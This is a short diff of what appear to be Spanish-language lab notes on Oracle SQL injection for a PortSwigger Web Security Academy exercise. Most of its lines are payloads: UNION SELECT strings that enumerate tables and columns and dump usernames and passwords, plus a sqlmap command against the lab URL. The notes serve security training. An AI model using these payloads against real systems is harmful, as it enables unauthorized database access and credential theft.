@@ -112,9 +112,9 @@ UNION SELECT NULL,NULL FROM dual-- -(DUAL es una tabla conocida de Oracle)
 
 '+UNION+SELECT+table_name,NULL+FROM+all_tables--
 
-'+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='USERS_ABCDEF'--
+'+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='USERS_UQBWZK'--
 
-'+UNION+SELECT+USERNAME_ABCDEF,+PASSWORD_ABCDEF+FROM+USERS_ABCDEF--
+'+UNION+SELECT+USERNAME_CPKXNX,+PASSWORD_MHEIKW+FROM+USERS_UQBWZK--
 
 sqlmap -u 'https://0a6d00360460e7dd8187719900d200c5.web-security-academy.net/filter?category=Tech+gifts' -p category --sql-query "SELECT USERNAME_LASZLI, PASSWORD_GLJIEZ FROM PETER.USERS_NYXISJ"
 ```
